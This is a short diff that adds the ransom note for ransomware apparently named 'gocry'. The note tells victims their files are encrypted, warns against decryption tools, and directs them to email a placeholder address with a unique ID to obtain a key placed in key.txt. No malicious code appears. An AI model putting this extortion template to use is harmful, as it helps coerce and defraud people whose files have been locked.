@@ -1,0 +1,10 @@
+
+Hello, you've been infected by gocry. Your files have been encrypted using military grade encryption >:D.
+Do not use any decryption software or change the files, otherwise they might be lost forever.
+
+How to decrypt:
+1. Send email to example@example.com containing your unique ID, then you'll  receive a key.
+2. Place the correct key into a file called key.txt in the root directory.
+3. After this all your files will be decrypted.
+
+Your unique ID is: b5f33e5d-74b1-4f3e-9f5f-89e67a8722dc
